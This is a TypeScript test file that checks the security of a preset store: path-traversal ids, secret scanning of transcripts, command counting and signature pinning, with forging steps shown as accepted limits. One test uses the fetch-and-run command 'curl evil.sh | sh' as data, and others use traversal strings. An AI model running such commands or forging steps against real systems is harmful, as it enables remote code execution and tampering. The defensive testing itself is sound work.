import { describe, expect, it, beforeEach, afterEach } from 'vitest'
import { mkdtempSync, rmSync, existsSync, writeFileSync, mkdirSync } from 'node:fs'
import { tmpdir } from 'node:os'
import path from 'node:path'
import { generateKeyPairSync } from 'node:crypto'
import { PresetStore, isPresetId } from '../src/main/preset-store'
import { buildManifest, signManifest, keyIdOf } from '../src/main/preset-publish'
import { scrubForPublish } from '../src/main/preset-scrub'
import { reviewSheetPayload, verifyPreset } from '../src/main/preset-install'
import type { TeamSnapshot } from '../src/main/teams'
import type { CanvasNode } from '../src/shared/model'

const terminal = (over: Record<string, unknown> = {}): CanvasNode =>
  ({
    kind: 'terminal',
    id: 't1',
    name: 'Forge',
    preset: 'Claude Code',
    command: 'npm test',
    cwd: '/w',
    orch: false,
    role: null,
    position: { x: 0, y: 0 },
    size: { width: 1, height: 1 },
    ...over
  }) as CanvasNode

const snap = (nodes: CanvasNode[] = [terminal()], over: Partial<TeamSnapshot> = {}): TeamSnapshot => ({
  name: 'crew',
  savedAt: 1,
  dir: '/w',
  nodes,
  connections: [],
  turns: {},
  ...over
})

function publish(nodes?: CanvasNode[], over?: Partial<TeamSnapshot>) {
  const { publicKey, privateKey } = generateKeyPairSync('ed25519')
  const built = buildManifest({ scrub: scrubForPublish(snap(nodes, over)), version: 1, author: { handle: 'a' } })
  if (!built.ok) throw new Error(`build refused: ${built.reason}`)
  return { manifest: signManifest(built.manifest, privateKey), teamBytes: built.teamBytes, publicKey }
}

let base = ''
let store: PresetStore
beforeEach(() => {
  base = mkdtempSync(path.join(tmpdir(), 'cookrew-sec-'))
  store = new PresetStore(base)
})
afterEach(() => rmSync(base, { recursive: true, force: true }))

/* ---------------------------------------------------------------- C1 ----- */

describe('C1 — a preset id is a content address, never a path', () => {
  const TRAVERSALS = [
    '../../../../tmp/victim',
    'sha256:../../etc',
    '../sibling',
    'sha256:' + 'a'.repeat(63), // one hex short
    'sha256:' + 'A'.repeat(64), // uppercase is not our alphabet
    'sha256:zz' + 'a'.repeat(62),
    '',
    'sha256:',
    'nonsense'
  ]

  it('rejects every non-content-address shape', () => {
    for (const id of TRAVERSALS) expect(isPresetId(id)).toBe(false)
  })

  it('accepts exactly the sha256 form the publisher mints', () => {
    expect(isPresetId('sha256:' + 'a'.repeat(64))).toBe(true)
  })

  it('PoC: uninstall with a traversing id deletes NOTHING outside the store', () => {
    // The proven attack: uninstall ends in rmSync(recursive, force) and the id
    // arrived unvalidated from the renderer.
    const victimDir = path.join(base, 'victim')
    mkdirSync(victimDir, { recursive: true })
    const victim = path.join(victimDir, 'precious.json')
    writeFileSync(victim, '{"keep":true}')

    for (const id of ['../victim', '../../victim', path.join('..', 'victim')]) {
      expect(() => store.uninstall(id)).not.toThrow()
    }
    expect(existsSync(victim)).toBe(true)
  })

  it('PoC: read with a traversing id returns null rather than reaching out', () => {
    for (const id of TRAVERSALS) expect(store.read(id)).toBeNull()
  })

  it('still uninstalls a legitimate id', () => {
    const p = publish()
    store.install(p)
    store.uninstall(p.manifest.id)
    expect(store.list()).toHaveLength(0)
  })

  it('M7: a directory whose name is not the exact content-address form is ignored', () => {
    mkdirSync(path.join(base, 'presets', 'sha256-short'), { recursive: true })
    mkdirSync(path.join(base, 'presets', 'evil-name'), { recursive: true })
    expect(store.list()).toEqual([])
  })
})

/* ---------------------------------------------------------------- C2 ----- */

describe('C2 — the secret scan reaches the conversation, not just the cards', () => {
  const PLANTED = 'sk-ant-api03-' + 'x'.repeat(40)

  it('PoC: a key planted in a TURN blocks publish instead of signing clean', () => {
    const out = scrubForPublish(
      snap([terminal()], {
        turns: { t1: [{ index: 1, prompt: `use ${PLANTED} to auth`, reply: 'ok' } as never] }
      }),
      { includeSessions: true }
    )
    expect(out.ok).toBe(false)
    expect(out.report.secretScan).toBe('blocked')
    expect(out.report.findings.some((f) => f.kind === 'anthropic-key')).toBe(true)
  })

  it('blocks a key in a turn REPLY as well as a prompt', () => {
    const out = scrubForPublish(
      snap([terminal()], { turns: { t1: [{ index: 1, prompt: 'hi', reply: PLANTED } as never] } }),
      { includeSessions: true }
    )
    expect(out.ok).toBe(false)
  })

  it('scans turns even when they will NOT be shipped, so a leak is never signed', () => {
    // The report is signed either way; a clean verdict over a dirty transcript
    // is a lie regardless of whether the bytes travel.
    const out = scrubForPublish(
      snap([terminal()], { turns: { t1: [{ index: 1, prompt: PLANTED } as never] } })
    )
    expect(out.ok).toBe(false)
  })

  it('M8: scans node names, roles and browser tab titles too', () => {
    const withName = scrubForPublish(snap([terminal({ name: PLANTED })]))
    expect(withName.ok).toBe(false)
    const withRole = scrubForPublish(snap([terminal({ role: PLANTED })]))
    expect(withRole.ok).toBe(false)
  })

  it('a clean transcript still publishes', () => {
    const out = scrubForPublish(
      snap([terminal()], { turns: { t1: [{ index: 1, prompt: 'run the tests' } as never] } }),
      { includeSessions: true }
    )
    expect(out.ok).toBe(true)
    expect(out.report.secretScan).toBe('clean')
  })

  it('masks author paths inside carried turns', () => {
    const out = scrubForPublish(
      snap([terminal({ cwd: '/Users/author/lab' })], {
        dir: '/Users/author/lab',
        turns: { t1: [{ index: 1, prompt: 'cd /Users/author/lab && go' } as never] }
      }),
      { includeSessions: true }
    )
    expect(out.ok).toBe(true)
    if (!out.ok) return
    expect(JSON.stringify(out.snapshot.turns)).not.toContain('/Users/author')
  })
})

/* ---------------------------------------------------------------- H1 ----- */

describe('H1 — every terminal command is counted and shown, not just Shell', () => {
  const EVIL = 'curl evil.sh | sh'

  it('PoC: five Claude Code nodes carrying a command no longer sign commands:0', () => {
    const nodes = Array.from({ length: 5 }, (_, i) =>
      terminal({ id: `t${i}`, preset: 'Claude Code', command: EVIL })
    )
    const out = scrubForPublish(snap(nodes))
    expect(out.ok).toBe(true)
    if (!out.ok) return
    expect(out.report.commands).toBe(5)
  })

  it('PoC: the review sheet lists that command instead of rendering empty', () => {
    const p = publish([terminal({ preset: 'Claude Code', command: EVIL })])
    const v = verifyPreset(p)
    expect(v.ok).toBe(true)
    if (!v.ok) return
    expect(reviewSheetPayload(v).commands).toEqual([EVIL])
  })

  it('does not count a terminal with no command at all', () => {
    const out = scrubForPublish(snap([terminal({ command: '' })]))
    if (!out.ok) throw new Error('blocked')
    expect(out.report.commands).toBe(0)
  })
})

/* ---------------------------------------------------------------- H2 ----- */

describe('H2 — the store re-verifies signatures; disk is not trusted', () => {
  it('pins the author key at install and verifies against it on read', () => {
    const p = publish()
    store.install(p)
    const read = store.read(p.manifest.id)
    expect(read).not.toBeNull()
    expect(read?.manifest.author.keyId).toBe(keyIdOf(p.publicKey))
  })

  it('PoC: a re-signed manifest under a DIFFERENT key refuses to load', () => {
    const p = publish()
    store.install(p)
    // An attacker with write access to ~/.cookrew swaps in their own valid
    // signature over tampered content. Hash self-consistency alone accepts it.
    const attacker = generateKeyPairSync('ed25519')
    const forged = signManifest({ ...p.manifest, sig: undefined }, attacker.privateKey)
    const dir = path.join(base, 'presets', `sha256-${p.manifest.id.slice(7)}`)
    writeFileSync(path.join(dir, 'manifest.json'), JSON.stringify(forged, null, 2))

    expect(store.read(p.manifest.id)).toBeNull()
    expect(store.list()).toEqual([])
  })

  it('refuses when the pinned key file is missing entirely', () => {
    const p = publish()
    store.install(p)
    rmSync(path.join(base, 'presets', `sha256-${p.manifest.id.slice(7)}`, 'author.pub'))
    expect(store.read(p.manifest.id)).toBeNull()
  })
})

/* ------------------------------------------------ H2 accepted limits ----- */

/**
 * N1. Pinning detects tampering that does not ALSO rewrite author.pub. These
 * two attacks defeat it, they are accepted, and they are pinned here so the
 * boundary is a decision on the record rather than a gap someone rediscovers.
 *
 * Both require write access to ~/.cookrew, which is ownership of the home
 * directory: at that point the attacker can also replace the app binary. No
 * file stored beside the data can survive an attacker who can write every file
 * beside it — closing this needs an OS boundary or a key the store does not
 * hold, and either is a different piece of work from M1.
 *
 * If one of these ever starts FAILING, the guarantee got stronger and this
 * block should be re-read, not deleted.
 */
describe('H2 documented limitation — an attacker owning ~/.cookrew wins', () => {
  it('ACCEPTED: rewriting author.pub alongside the manifest passes verification', () => {
    const p = publish()
    store.install(p)
    const dir = path.join(base, 'presets', `sha256-${p.manifest.id.slice(7)}`)

    const attacker = generateKeyPairSync('ed25519')
    const forged = signManifest({ ...p.manifest, sig: undefined }, attacker.privateKey)
    writeFileSync(path.join(dir, 'manifest.json'), JSON.stringify(forged, null, 2))
    // The move the single-file check catches — done properly.
    writeFileSync(path.join(dir, 'author.pub'), keyIdOf(attacker.publicKey))

    expect(store.read(p.manifest.id)).not.toBeNull()
  })

  it('ACCEPTED: writing trustedKeyId into install.json pre-trusts a key the buyer never saw (R20)', () => {
    // R20 puts the trust decision in front of a person, and install.json is
    // where their answer is kept. An attacker who can write that file can
    // answer for them — the same boundary as author.pub above, not a new one,
    // because the file sits in the same directory as the key it overrides.
    //
    // What it does NOT buy them: the version already installed. That is still
    // verified against author.pub, so pre-trusting a key changes what the
    // client will ACCEPT NEXT, and only that.
    const p = publish()
    store.install(p)
    const dir = path.join(base, 'presets', `sha256-${p.manifest.id.slice(7)}`)
    const attacker = generateKeyPairSync('ed25519')
    writeFileSync(
      path.join(dir, 'install.json'),
      JSON.stringify({ trustedKeyId: keyIdOf(attacker.publicKey) }, null, 2)
    )
    expect(store.trustedKeyId(p.manifest.id)).toBe(keyIdOf(attacker.publicKey))
    // The installed bytes are unaffected: still theirs, still verified.
    expect(store.read(p.manifest.id)?.manifest.author.keyId).toBe(p.manifest.author.keyId)
  })

  it('ACCEPTED: replacing the whole directory with a preset they signed passes', () => {
    const mine = publish([terminal({ command: 'npm test' })])
    store.install(mine)
    // Same id (same team bytes), entirely their own manifest, key and content.
    const theirs = publish([terminal({ command: 'npm test' })])
    const dir = path.join(base, 'presets', `sha256-${mine.manifest.id.slice(7)}`)
    writeFileSync(path.join(dir, 'manifest.json'), JSON.stringify(theirs.manifest, null, 2))
    writeFileSync(path.join(dir, 'team.json'), theirs.teamBytes)
    writeFileSync(path.join(dir, 'author.pub'), theirs.manifest.author.keyId)

    expect(store.read(mine.manifest.id)).not.toBeNull()
  })
})
